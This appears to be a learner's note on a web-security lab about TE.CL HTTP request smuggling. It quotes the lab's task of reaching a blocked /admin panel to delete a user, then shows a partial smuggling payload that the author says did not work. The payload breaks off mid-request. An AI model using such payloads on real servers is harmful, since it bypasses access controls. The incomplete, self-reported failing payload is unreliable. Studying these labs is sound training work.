Title: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
Level: PRACTITIONER
Desc:  This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.
To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.

Below should work, but in my case it was not working at all...
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
